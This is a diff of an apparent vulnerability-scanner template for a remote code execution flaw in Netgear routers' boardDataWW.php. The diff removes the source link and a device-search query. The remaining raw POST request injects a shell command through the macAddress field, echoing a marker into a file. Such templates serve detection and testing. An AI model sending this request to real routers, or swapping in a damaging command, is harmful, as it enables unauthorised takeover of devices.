@@ -3,20 +3,14 @@ info:
   name: netgear路由器 boarddataww RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dar7qikf3xc7g0wg'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dar7qikf3xc7g0wg
-    fofa: title=="Netgear"
 http:
 - raw:
   - 'POST /boardDataWW.php HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     macAddress=112233445566%3Becho 123456+%3E+.%2Foutput+%23®info=0&writeData=Submit
